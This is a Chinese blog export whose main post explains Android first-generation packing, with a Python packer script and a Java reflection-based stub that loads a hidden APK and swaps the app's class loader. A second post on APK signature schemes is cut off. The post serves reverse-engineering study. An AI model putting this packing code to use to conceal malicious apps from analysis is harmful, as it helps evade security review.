[{"title":"安卓整体加壳（一代壳）原理及实践","path":"/2024/09/15/安卓整体加壳（一代壳）原理及实践/","content":"安卓整体加壳（一代壳）原理及实践目录 1 一代壳简介 1.1 DEX加密（也称落地加载） 1.2 相关脱壳方法 2 app启动流程 2.1 ActivityThread.java 2.2 LoadedApk.java 2.3 Instrumentation.java 2.4 Application.java 2.5 ActivityThread.java 3 基本原理 4 加壳实践 4.1 源程序 4.2 加壳工具 4.3 脱壳程序 4.3.1 代理Application 4.3.2 读取自身apk 4.3.3 读取dex 4.3.4 提取源apk 4.3.5 修正加载器（重点） 4.3.6 加载源apk 4.3.7 加载源Application 4.3.8 加载资源 5 问题 6 引用 写在前面：写这篇文章真是呕心沥血，网上对一代壳的技术分析很多，但是有实践操作的文章少。一代壳虽然原理简单，但是实现细节很多，并且学习一代壳能够学习到很多二三代壳也用得到的原理和技术，写这篇文章反反复复看了很多其他大佬的文章，但难免还是会漏掉一些要点，比如双亲委派模型就一句话带过了，还需要读者们自己去看文章了解。由于整体加壳的方式是两个项目嵌套，想要写一步调试一步是有点麻烦的，写的过程中只能摸着石头过河，写完了再一起去debug，还是挺磨性子的。希望这篇文章能给刚入门脱壳的读者们带来一些启发，文中写的不严谨的地方欢迎指正。 1 一代壳简介1.1 DEX加密（也称落地加载）第一代壳将整个 apk 文件压缩加密到壳 dex 文件的后面，在壳 dex 文件上写上解压代码，动态加载执行，由于是加密整个 apk，在大型应用中很耗资源，因此这代壳很早就被放弃了但思路还是不变。其中这种加密还可以具体划分为几个方向，如下： Dex 字符串加密 静态 DEX 文件整体加密解密 资源加密（ xml 与 arsc 文件加密及十六进制加密） 对抗反编译（针对反编译工具，如 apktool。利用反编译工具本身存在的缺陷，使得反编译失败，以此实现对反编译工具的抵抗） Ptrace 反调试、TracePid 值校验反调试 自定义 DexClassLoader（主要是针对 dex 文件加固、加壳等情况） 落地加载（ dex 可以在 apk 目录下看到） 1.2 相关脱壳方法 内存 Dump 法 缓存脱壳法 文件监视法 Hook 法 定制系统法 动态调试法 2 app启动流程ActivityThread.main()是进入App世界的大门，所以从ActivityThread.main()开始，了解一下app启动过程中的一些细节。如果十分了解app的启动流程，这部分就可以看的快一点。 了解启动流程主要关注调用了Application什么方法，因为一代壳的实现是依赖于app启动时的一些初始化调用来加载或解密dex文件的。 2.1 ActivityThread.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;ActivityThread.java attach方法如下 这里的调用栈就不深入了，接下来会调用到bindApplication方法↓ 这里的H是ActivityThread的一个内置类 在这个H类中有处理消息的逻辑 最终调用handleBindApplication，进行app实例化。 从实例化开始，就要进行深入了。data.info是一个LoadedApk类。 2.2 LoadedApk.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;LoadedApk.java app的创建进入到了Instrumentation的newApplication中 2.3 Instrumentation.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;Instrumentation.java newApplication有两种实现模式，这里看参数采用的应当是第一种。 两种方式都是先实例化app，然后调用app.attach。于是接下来看attach做了什么。 2.4 Application.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;Application.java 在attach中调用了attachBaseContext 2.5 ActivityThread.java源码地址：&#x2F;frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;app&#x2F;ActivityThread.java 再回到ActivityThread.java的handleBindApplication中，还会有调用Application的OnCreate函数。 至此可知App的启动流程是 3 基本原理在Application启动流程结束之后才会进入MainActivity中的attachBaseContext函数、onCreate函数。 所以壳要在程序正式执行前，也就是上面的流程中进行动态加载和类加载器的修正，这样才能对加密的dex进行释放，而一般的壳往往选择在Application中的attachBaseContext或onCreate函数进行。 简单点说，就是把源程序给藏起来，然后在外面包一层用于脱壳的程序，这个脱壳的程序会把源程序给释放出来，并通过反射机制，加载源程序。 4 加壳实践加壳之前，需要明确分为哪几步。 生成一个源程序（安卓项目），一般来说是将源程序打包为apk之后藏起来，这样的好处在于源程序的各类资源也都被藏了起来。举一反三既然可以藏整个apk，那么也可以分开藏一些东西。 写一个加壳工具，这个程序不是一个安卓项目，可以用任意语言（本文使用python）实现功能，就是一个工具。 脱壳程序，确定了我们如何藏我们的apk文件之后，使用脱壳程序来释放源程序，并加载。 构建完成之后我们app的入口应当在脱壳程序里。 4.1 源程序简单新建项目，创建一个空Activity。 在Activity的OnCreate方法中打印一下。 1Log.i(&quot;demo&quot;, &quot;app:&quot;+getApplicationContext()); 然后添加一个MyAppliaction类，并重写一下OnCreate，输出一下Log。 4.2 加壳工具将按照下图的结构构建新dex 这里为了理解画了一个流程图 这里没有对apk数据进行处理，如有需要修改process_apk_data即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import hashlibimport os.pathimport shutilimport sysimport zlibimport zipfiledef process_apk_data(apk_data:bytes): &quot;&quot;&quot; 用于处理apk数据，比如加密，压缩等，都可以放在这里。 :param apk_data: :return: &quot;&quot;&quot; return apk_data# 使用前需要修改的部分keystore_path=&#x27;demo1.keystore&#x27;keystore_password=&#x27;123456&#x27;src_apk_file_path= &#x27;/Users/zhou39512/AndroidStudioProjects/MyApplication/app/build/outputs/apk/debug/app-debug.apk&#x27;shell_apk_file_path= &#x27;/Users/zhou39512/AndroidStudioProjects/Unshell/app/build/outputs/apk/debug/app-debug.apk&#x27;buildtools_path=&#x27;~/Library/Android/sdk/build-tools/34.0.0/&#x27;# 承载apk的文件名carrier_file_name= &#x27;classes.dex&#x27;# 中间文件夹intermediate_dir= &#x27;intermediates&#x27;intermediate_apk_name=&#x27;app-debug.apk&#x27;intermediate_aligned_apk_name=&#x27;app-debug-aligned.apk&#x27;intermediate_apk_path=os.path.join(intermediate_dir,intermediate_apk_name)intermediate_carrier_path=os.path.join(intermediate_dir, carrier_file_name)intermediate_aligned_apk_path=os.path.join(intermediate_dir,intermediate_aligned_apk_name)if os.path.exists(intermediate_dir): shutil.rmtree(intermediate_dir)os.mkdir(intermediate_dir)# 解压apkshell_apk_file=zipfile.ZipFile(shell_apk_file_path)shell_apk_file.extract(carrier_file_name,intermediate_dir)# 查找dexif not os.path.exists(os.path.join(intermediate_dir, carrier_file_name)): raise FileNotFoundError(f&#x27;&#123;carrier_file_name&#125; not found&#x27;)src_dex_file_path= os.path.join(intermediate_dir, carrier_file_name)#读取src_apk_file=open(src_apk_file_path, &#x27;rb&#x27;)src_dex_file=open(src_dex_file_path, &#x27;rb&#x27;)src_apk_data=src_apk_file.read()src_dex_data=src_dex_file.read()# 处理apk数据processed_apk_data=process_apk_data(src_apk_data)processed_apk_size=len(processed_apk_data)# 构建新dex数据new_dex_data=src_dex_data+processed_apk_data+int.to_bytes(processed_apk_size,8,&#x27;little&#x27;)# 更新文件大小file_size=len(processed_apk_data)+len(src_dex_data)+8new_dex_data=new_dex_data[:32]+int.to_bytes(file_size,4,&#x27;little&#x27;)+new_dex_data[36:]# 更新sha1摘要signature=hashlib.sha1().digest()new_dex_data=new_dex_data[:12]+signature+new_dex_data[32:]# 更新checksumchecksum=zlib.adler32(new_dex_data[12:])new_dex_data=new_dex_data[:8]+int.to_bytes(checksum,4,&#x27;little&#x27;)+new_dex_data[12:]# 写入新dexintermediate_carrier_file= open(intermediate_carrier_path, &#x27;wb&#x27;)intermediate_carrier_file.write(new_dex_data)intermediate_carrier_file.close()src_apk_file.close()src_dex_file.close()# 添加环境变量，为重打包做准备os.environ.update(&#123;&#x27;PATH&#x27;:os.environ.get(&#x27;PATH&#x27;)+f&#x27;:&#123;buildtools_path&#125;&#x27;&#125;)# 重打包r=os.popen(f&quot;cp &#123;shell_apk_file_path&#125; &#123;intermediate_apk_path&#125;&quot;).read()print(r)os.chdir(intermediate_dir)r=os.popen(f&#x27;zip &#123;intermediate_apk_name&#125; &#123;carrier_file_name&#125;&#x27;).read()os.chdir(&#x27;../&#x27;)print(r)# 对齐r=os.popen(f&#x27;zipalign 4 &#123;intermediate_apk_path&#125; &#123;intermediate_aligned_apk_path&#125;&#x27;).read()print(r)# 签名r=os.popen(f&#x27;apksigner sign -ks &#123;keystore_path&#125; --ks-pass pass:&#123;keystore_password&#125; &#123;intermediate_aligned_apk_path&#125;&#x27;).read()print(r)r=os.popen(f&#x27;cp &#123;intermediate_aligned_apk_path&#125; ./app-out.apk&#x27;).read()print(r)print(&#x27;Success&#x27;) 这里涉及到重打包的过程，具体可以看安卓打包流程。这里需要用安卓SDK中的zipalign和apksigner进行对齐和重打包。 4.3 脱壳程序接下来编写套在源程序外面的脱壳程序。由于我们最终需要运行的是我们的源程序，所以我们必须在启动流程调用Application的OnCreate之前释放出源程序，并替换Application为我们的源程序Application实例（原来是脱壳程序的Application实例）。 我们在基本原理这一节中研究了启动流程，所以在Application的OnCreate之前，有一个attachBaseContext方法，我们可以通过重写该方法来实现上面的效果。 4.3.1 代理Application这里我们要写一个代理Application，作为app的Application实例。并重写一下attachBaseContext。 12345678public class ProxyApplication extends Application &#123; @Override protected void attachBaseContext(Context base) &#123; Log.i(&quot;demo&quot;,&quot;attachBaseContext&quot;); super.attachBaseContext(base); &#125;&#125; 然后要修改AndroidManifest.xml，将Application的实例改为我们自定义的ProxyApplication 之后运行。在Logcat中看到输出了log则说明成功。 4.3.2 读取自身apk在Application中，需要获取到自身的apk文件。 12345private ZipFile getApkZip() throws IOException &#123; Log.i(&quot;demo&quot;, this.getApplicationInfo().sourceDir); ZipFile apkZipFile = new ZipFile(this.getApplicationInfo().sourceDir); return apkZipFile;&#125; 我们先测试一下，打印看看this.getApplicationInfo().sourceDir是什么 发现是一个缓存存储apk的地址，并且就是apk的路径（而非文件夹路径）。 4.3.3 读取dex12345678910111213private byte[] readDexFileFromApk() throws IOException &#123; /* 从本体apk中获取dex文件 */ ZipFile apkZip = this.getApkZip(); ZipEntry zipEntry = apkZip.getEntry(&quot;classes.dex&quot;); InputStream inputStream = apkZip.getInputStream(zipEntry); byte[] buffer = new byte[1024]; ByteArrayOutputStream baos = new ByteArrayOutputStream(); int length; while ((length = inputStream.read(buffer)) &gt; 0) &#123; baos.write(buffer, 0, length); &#125; return baos.toByteArray();&#125; 4.3.4 提取源apk12345678910private byte[] splitSrcApkFromDex(byte[] dexFileData) &#123; /* 从dex文件中分离源apk文件 */ int length = dexFileData.length; ByteBuffer bb = ByteBuffer.wrap(Arrays.copyOfRange(dexFileData, length - 8, length)); bb.order(java.nio.ByteOrder.LITTLE_ENDIAN); // 设置为小端模式 long processedSrcApkDataSize = bb.getLong(); // 读取这8个字节作为long类型的值 byte[] processedSrcApkData=Arrays.copyOfRange(dexFileData, (int) (length - 8 - processedSrcApkDataSize), length - 8); byte[] srcApkData=reverseProcessApkData(processedSrcApkData); return srcApkData;&#125; 4.3.5 修正加载器（重点）这里开始需要了解双亲委派模型，简单而言就是java中的类加载器有父子关系，当某个加载器需要加载某个类的时候，先会交给其父类，如果加载过了就直接返回，如此往上，如果父加载器都加载不了，再抛回来自己加载。 关于加载源apk，这里有两个细节且重要的问题需要思考清楚。从这里开始希望大家放慢阅读速度。 如何加载**dex**文件？ 如何让加载之后的**Application**进入后续的加载流程？ 这里拿一张非常重要的图 首先解决第一个问题，如何加载**dex**文件？ 引用佬的文章介绍一下BaseDexClassLoader类加载器 Android里边的BaseDexClassLoader可以实现在运行的时候加载在编译时未知的dex文件，经过此加载器的加载，ART虚拟机内存中会形成相应的数据结构，对应的dex文件也会由mmap映射到虚拟内存当中，通过此加载器的loadClass(String className, boolean resolve)方法就可以得到类的Class对象，从而可以使用该类。 查看源码可以看到PathClassLoader是继承自BaseDexClassLoader的，而PathClassLoader还有另外两个兄弟: InMemoryDexClassLoader以及DexClassLoader，而壳程序很多都使用了这两个类加载器来加载解密后的dex文件。其中InMemoryDexClassLoader是Android8.0以后新增的类，可以实现所谓的”不落地加载”。 作者：Jerry_Deng链接：https://juejin.cn/post/6962096676576165918来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 总结一下，InMemoryDexClassLoader、DexClassLoader、PathClassLoader都继承自BaseDexClassLoader，我们可以用他们来加载dex。 第二个问题，如何让加载之后的**Application**进入后续的加载流程？ 后续的加载流程指的就是app组件（比如Activity）的加载，而加载组件时，使用的是加载应用程序的ClassLoader。 如若不做任何处理，仅仅在**attachBaseContext方法中使用上面讲的某个类加载器对dex加载，后续加载源程序的组件时会出现ClassNotFoundException**的错误，为什么会这样？ 这是因为如果仅仅在attachBaseContext方法中使用类加载器加载dex，之后加载组件时使用的ClassLoader和我们使用的加载器不同，并且，加载组件的ClassLoader通过双亲委派模型发现没有人能加载组件类（因为组件类在我们的dex中），导致ClassNotFoundException。 还记得BaseDexClassLoader吗，其有一个DexPathList，记录了已加载的dex文件路径。 加载组件时对应的BaseDexClassLoader的DexPathList是没有源程序的dex路径的，如果尝试让BaseDexClassLoader加载不在这个列表中的类，就会报ClassNotFoundException。 因此有两种方法可以解决这个问题。 既然使用的加载器不同，那么改成相同的不就行了。 通过反射获取到LoadedApk，修改其mClassLoader为我们加载dex文件的ClassLoader实例，这样后续试图加载组件类的时候，就能找到相应的类。 通过打破原有双亲委派关系，添加我们的ClassLoader进入关系网。 原先的mClassLoader是PathClassLoader，其在双亲委派关系中的父亲是BootClassLoader，所以只要将我们的ClassLoader添加进他们两个之间即可。也就是将PathClassLoader的父亲设置为我们自己的ClassLoader，再将我们自己的ClassLoader的父亲设置为BootClassLoader。如下图 理解完以上这些，可以开始实践了。 第一种方法，需要思考如何拿到LoadedApk。在启动流程的handleBindApplication中，data.info就是我们要拿到的LoadedApk。 向上找到data.info初始化的地方。 跟进方法 关键代码 所以我们要从mPackages里面找LoadedApk。 1234567891011121314151617181920212223242526272829public static void replaceClassLoader1(Context context,DexClassLoader dexClassLoader)&#123; ClassLoader pathClassLoader = ProxyApplication.class.getClassLoader(); try &#123; // 1.通过currentActivityThread方法获取ActivityThread实例 Class ActivityThread = pathClassLoader.loadClass(&quot;android.app.ActivityThread&quot;); Method currentActivityThread = ActivityThread.getDeclaredMethod(&quot;currentActivityThread&quot;); Object activityThreadObj = currentActivityThread.invoke(null); // 2.拿到mPackagesObj Field mPackagesField = ActivityThread.getDeclaredField(&quot;mPackages&quot;); mPackagesField.setAccessible(true); ArrayMap mPackagesObj = (ArrayMap) mPackagesField.get(activityThreadObj); // 3.拿到LoadedApk String packageName = context.getPackageName(); WeakReference wr = (WeakReference) mPackagesObj.get(packageName); Object LoadApkObj = wr.get(); // 4.拿到mClassLoader Class LoadedApkClass = pathClassLoader.loadClass(&quot;android.app.LoadedApk&quot;); Field mClassLoaderField = LoadedApkClass.getDeclaredField(&quot;mClassLoader&quot;); mClassLoaderField.setAccessible(true); Object mClassLoader =mClassLoaderField.get(LoadApkObj); Log.i(&quot;mClassLoader&quot;,mClassLoader.toString()); // 5.将系统组件ClassLoader给替换 mClassLoaderField.set(LoadApkObj,dexClassLoader); &#125; catch (Exception e) &#123; Log.i(&quot;demo&quot;, &quot;error:&quot; + Log.getStackTraceString(e)); e.printStackTrace(); &#125;&#125; 4.3.6 加载源apk我们使用DexClassLoader加载dex，还需要解决几个参数。 dexPath：dex文件路径 optimizedDirectory： dex 优化后存放的位置，在 ART 上，会执行 oat 对 dex 进行优化，生成机器码，这里就是存放优化后的 odex 文件的位置。 librarySearchPath：native 依赖的位置 parent：双亲委派中的父亲，这里是PathClassLoader。 Context.getDir方法是在app的目录下新建app_的文件夹。比如打印base.getDir(&quot;opt_dex&quot;,0)，结果是 /data/user/0/com.xxx.unshell/app_opt_dex 代码如下 1234567891011121314151617181920212223242526272829303132333435@Overrideprotected void attachBaseContext(Context base) &#123; Log.i(&quot;demo&quot;, &quot;attachBaseContext&quot;); super.attachBaseContext(base); try &#123; byte[] dexFileData=this.readDexFileFromApk(); byte[] srcApkData=this.splitSrcApkFromDex(dexFileData); // 创建储存apk的文件夹，写入src.apk File apkDir=base.getDir(&quot;apk_out&quot;,MODE_PRIVATE); srcApkPath=apkDir.getAbsolutePath()+&quot;/src.apk&quot;; File srcApkFile = new File(srcApkPath); srcApkFile.setWritable(true); FileOutputStream fos=new FileOutputStream(srcApkFile); Log.i(&quot;demo&quot;, String.format(&quot;%d&quot;,srcApkData.length)); fos.write(srcApkData); fos.close(); srcApkFile.setReadOnly(); // 受安卓安全策略影响，dex必须为只读 Log.i(&quot;demo&quot;,&quot;Write src.apk into &quot;+srcApkPath); // 新建加载器 File optDir =base.getDir(&quot;opt_dex&quot;,MODE_PRIVATE); File libDir =base.getDir(&quot;lib_dex&quot;,MODE_PRIVATE); optDirPath =optDir.getAbsolutePath(); libDirPath =libDir.getAbsolutePath(); ClassLoader pathClassLoader = ProxyApplication.class.getClassLoader(); DexClassLoader dexClassLoader=new DexClassLoader(srcApkPath, optDirPath, libDirPath,pathClassLoader); Log.i(&quot;demo&quot;,&quot;Successfully initiate DexClassLoader.&quot;); // 修正加载器 replaceClassLoader1(base,dexClassLoader); Log.i(&quot;demo&quot;,&quot;ClassLoader replaced.&quot;); &#125; catch (Exception e) &#123; Log.i(&quot;demo&quot;, &quot;error:&quot; + Log.getStackTraceString(e)); e.printStackTrace(); &#125;&#125; 当我们替换掉加载器之后，app加载流程走完，会加载Activity，此时我们为了让系统加载我们源程序的Activity，我们需要修改xml文件，将脱壳程序的Activity入口替换为源程序的入口。 之后我们build apk，然后用加壳程序处理，并安装。 启动程序，查看log，发现了我们在源程序中写的Log，说明启动源程序的Activity成功。 加载成功！ 4.3.7 加载源Application到了这里加壳的核心部分已经结束了，接下来都是补充的部分。 如果源程序也有自定义的Application，我们就需要重新makeApplication，进入到源程序的Application，保证程序的完整生命周期。 注册application(用LoadedApk中的makeApplication方法注册)。 为了使用makeApplication重新注册application，需要先把mApplication置空 并且还需要在在ActivityThread下的链表mAllApplications中移除mInitialApplication。mAllApplications存放的是所有的应用，mInitialApplication存放的是初始化的应用（即当前壳应用）。把当前的壳应用，从现有的应用中移除掉，然后在makeApplication方法中会把新构建的加入到里面去。 之后，替换ActivityThread中mInitialApplication为刚刚makeApplication创建的app。 总结操作流程就是 将LoadedApk的mApplication置空 从ActivityThread的mAllApplications中移除mInitialApplication makeApplication() 替换ActivityThread中mInitialApplication12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849super.onCreate();Log.i(TAG,&quot;进入onCreate方法&quot;);// 提取提前配置的ApplicationName，来引导到源程序的Application入口String applicationName=&quot;&quot;;ApplicationInfo ai=null;try &#123; ai=getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA); if (ai.metaData!=null)&#123; applicationName=ai.metaData.getString(&quot;ApplicationName&quot;); &#125;&#125; catch (PackageManager.NameNotFoundException e) &#123; e.printStackTrace();&#125;// 将当前进程的mApplication设置为nullObject activityThreadObj=RefinvokeMethod.invokeStaticMethod(&quot;android.app.ActivityThread&quot;,&quot;currentActivityThread&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);Object mBoundApplication=RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mBoundApplication&quot;);Object info=RefinvokeMethod.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplication,&quot;info&quot;);RefinvokeMethod.setField(&quot;android.app.LoadedApk&quot;,&quot;mApplication&quot;,info,null);// 从ActivityThread的mAllApplications中移除mInitialApplicationObject mInitApplication=RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mInitialApplication&quot;);ArrayList&lt;Application&gt; mAllApplications= (ArrayList&lt;Application&gt;) RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mAllApplications&quot;);mAllApplications.remove(mInitApplication);// 更新两处classNameApplicationInfo mApplicationInfo= (ApplicationInfo) RefinvokeMethod.getField(&quot;android.app.LoadedApk&quot;,info,&quot;mApplicationInfo&quot;);ApplicationInfo appinfo= (ApplicationInfo) RefinvokeMethod.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplication,&quot;appInfo&quot;);mApplicationInfo.className=applicationName;appinfo.className=applicationName;// 执行makeApplication(false,null)Application app= (Application) RefinvokeMethod.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,info,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;false,null&#125;);// 替换ActivityThread中mInitialApplicationRefinvokeMethod.setField(&quot;android.app.ActivityThread&quot;,&quot;mInitialApplication&quot;,activityThreadObj,app);// 更新ContentProviderArrayMap mProviderMap= (ArrayMap) RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mProviderMap&quot;);Iterator iterator=mProviderMap.values().iterator();while (iterator.hasNext())&#123; Object mProviderClientRecord=iterator.next(); Object mLocalProvider=RefinvokeMethod.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,mProviderClientRecord,&quot;mLocalProvider&quot;); RefinvokeMethod.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,app);&#125;// 执行新app的onCreate方法app.onCreate(); 解释一下这里修改className的操作。源程序可能也有自定义的一个Application类，如果有的话我们需要提前配置在xml的meta-data中提前设置，之后提取出来。 当然也可以通过解析源程序的xml来实现，感兴趣可以研究一下。 更新ContentProvider。 ContentProvider是Android系统中的一个组件，用于在不同的应用程序之间共享数据。需要修改mProviderMap中所有ContentProvider的mContext为新app 1234567ArrayMap mProviderMap= (ArrayMap) RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mProviderMap&quot;);Iterator iterator=mProviderMap.values().iterator();while (iterator.hasNext())&#123; Object mProviderClientRecord=iterator.next(); Object mLocalProvider=RefinvokeMethod.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,mProviderClientRecord,&quot;mLocalProvider&quot;); RefinvokeMethod.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,app);&#125; 执行新app的onCreate方法 1app.onCreate(); 总体代码如下，这里用到的RefinvokeMethod贴到了文章最下面问题一节中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354@Overridepublic void onCreate() &#123; super.onCreate(); loadResources(apkFileName); Log.i(TAG,&quot;进入onCreate方法&quot;); // 提取提前配置的ApplicationName，来引导到源程序的Application入口 String applicationName=&quot;&quot;; ApplicationInfo ai=null; try &#123; ai=getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA); if (ai.metaData!=null)&#123; applicationName=ai.metaData.getString(&quot;ApplicationName&quot;); &#125; &#125; catch (PackageManager.NameNotFoundException e) &#123; e.printStackTrace(); &#125; // 将当前进程的mApplication设置为null Object activityThreadObj=RefinvokeMethod.invokeStaticMethod(&quot;android.app.ActivityThread&quot;,&quot;currentActivityThread&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;); Object mBoundApplication=RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mBoundApplication&quot;); Object info=RefinvokeMethod.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplication,&quot;info&quot;); RefinvokeMethod.setField(&quot;android.app.LoadedApk&quot;,&quot;mApplication&quot;,info,null); // 从ActivityThread的mAllApplications中移除mInitialApplication Object mInitApplication=RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mInitialApplication&quot;); ArrayList&lt;Application&gt; mAllApplications= (ArrayList&lt;Application&gt;) RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mAllApplications&quot;); mAllApplications.remove(mInitApplication); // 更新两处className ApplicationInfo mApplicationInfo= (ApplicationInfo) RefinvokeMethod.getField(&quot;android.app.LoadedApk&quot;,info,&quot;mApplicationInfo&quot;); ApplicationInfo appinfo= (ApplicationInfo) RefinvokeMethod.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplication,&quot;appInfo&quot;); mApplicationInfo.className=applicationName; appinfo.className=applicationName; // 执行makeApplication(false,null) Application app= (Application) RefinvokeMethod.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,info,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;false,null&#125;); // 替换ActivityThread中mInitialApplication RefinvokeMethod.setField(&quot;android.app.ActivityThread&quot;,&quot;mInitialApplication&quot;,activityThreadObj,app); // 更新ContentProvider ArrayMap mProviderMap= (ArrayMap) RefinvokeMethod.getField(&quot;android.app.ActivityThread&quot;,activityThreadObj,&quot;mProviderMap&quot;); Iterator iterator=mProviderMap.values().iterator(); while (iterator.hasNext())&#123; Object mProviderClientRecord=iterator.next(); Object mLocalProvider=RefinvokeMethod.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,mProviderClientRecord,&quot;mLocalProvider&quot;); RefinvokeMethod.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,app); &#125; // 执行新app的onCreate方法 app.onCreate();&#125; 这里通过Log我们可能会看到报错如下 这是不影响的，因为我们等于是又重新启动了一次App，只不过这次的Application设置的是源程序的Application。 这个报错的源码位于LoadedApk.java 可以看到我们的源程序自定义的Application还是成功加载了 4.3.8 加载资源我们通过这样的方式加载源程序，源程序的资源似乎并没有被加载进来，所以这里继续讲如何把源程序的资源加载进来。 当然我们也可以直接把源程序的资源复制到壳程序下面，但加壳的目就是为了保护代码和资源，所以最好还是动态加载。 这里资源加载可能还涉及到Resources类的更换，实现起来还有点麻烦，这里就暂且阁下不表。 5 问题 在过程中出现 Writable dex file &#39;/data/user/0/com.jok.unshell/app_opt_dex/src.apk&#39; is not allowed这样的报错，原因是Android14有一个改动： 更安全的动态代码加载，简单来说就是打开DEX、JAR、APK等文件时必须将DEX文件设置为只读。 RefinvokeMethod.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import java.lang.reflect.Field;import java.lang.reflect.Method;public class RefinvokeMethod &#123; public static Object invokeStaticMethod(String class_name,String method_name,Class[] classes,Object[] objects)&#123; try &#123; Class aClass = Class.forName(class_name); Method method = aClass.getMethod(method_name, classes); return method.invoke(null,objects); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; public static Object invokeMethod(String class_name,String method_name,Object obj,Class[] classes,Object[] objects)&#123; try &#123; Class aClass = Class.forName(class_name); Method method = aClass.getMethod(method_name, classes); return method.invoke(obj,objects); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; public static Object getField(String class_name,Object obj,String field_name)&#123; try &#123; Class aClass = Class.forName(class_name); Field field = aClass.getDeclaredField(field_name); field.setAccessible(true); return field.get(obj); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; public static Object getStaticField(String class_name,String field_name)&#123; try &#123; Class aClass = Class.forName(class_name); Field field = aClass.getDeclaredField(field_name); field.setAccessible(true); return field.get(null); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; public static void setField(String class_name,String field_name,Object obj,Object value)&#123; try &#123; Class aClass = Class.forName(class_name); Field field = aClass.getDeclaredField(field_name); field.setAccessible(true); field.set(obj,value); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void setStaticField(String class_name,String field_name,Object value)&#123; try &#123; Class aClass = Class.forName(class_name); Field field = aClass.getDeclaredField(field_name); field.setAccessible(true); field.set(null,value); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 如果没在xml里面指定源程序的Activity，那就需要在壳程序的attachBaseContext中添加如下代码运行MainActivity。123456try &#123; Object objectMain = dexClassLoader.loadClass(&quot;com.example.sourceapk.MainActivity&quot;); Log.i(TAG,&quot;MainActivity类加载完毕&quot;);&#125; catch (ClassNotFoundException e) &#123; e.printStackTrace();&#125;","tags":["2024","Android","Shell"],"categories":["Study","Android"]},{"title":"安卓签名校验机制解析","path":"/2024/09/15/安卓签名校验机制解析/","content":"安卓签名校验机制目录 1 V1方案 1.1 V1方案的安全性 2 V2方案 2.1 摘要计算过程 2.2 防回滚绕过 3 V3方案 4 V4方案 5 签名实践 5.1 keytool生成密钥库 5.2 jarsigner 5.3 apksigner 6 引用 安卓的签名校验机制共有三代。 9.0以上的系统会判断apk是否使用到V3版本的签名，如果有，那么按照V3版本签名校验方式进行校验校验成功直接安装，校验失败拒绝安装；如果apk不是使用V3签名，判断是不是使用V2,如果没有使用V2那么再判断是不是使用V1的签名。 1 V1方案v1签名后会增加META-INF文件夹，其中会有如下三个文件： MANIFEST.MF：储存apk中每一个文件的摘要。 *.SF：MANIFEST.MF 文件的摘要信息以及 MANIFEST.MF 文件当中每个条目在用摘要算法计算得到的摘要信息。 *.RSA：包含*.SF的签名及签名的公钥证书 以小米万能遥控的包apk为例 META-INF文件夹 MANIFEST.MF储存了文件名及其SHA256摘要的base64编码 *.SF比MANIFEST.MF多了MANIFEST.MF的摘要，并且对MANIFEST.MF中的每个模块都进行了摘要。 如何区别一个模块，查看文件的十六进制，一个模块是以0D0A0D0A结尾的，其实就是两次换行。 取AndroidManifest.xml模块来验证 *.RSA是PKCS#7格式的数据经过ASN.1 DER规则编码之后的二进制文件 使用以下命令行读取 1openssl pkcs7 -inform DER -in &lt;*.RSA文件路径&gt; -text -noout -print_certs 1.1 V1方案的安全性APK 包的完整性校验不够强。如果我们在 APK 签名后，对 APK 包中没有涉及到原始文件的数据块做改变，那么这层校验机制就会失效。 2 V2方案APK 签名方案 v2 是一种全文件签名方案，该方案能够发现对 APK 受保护部分进行的所有更改 APK Signing Bolck 由这几个部分组成： 偏移 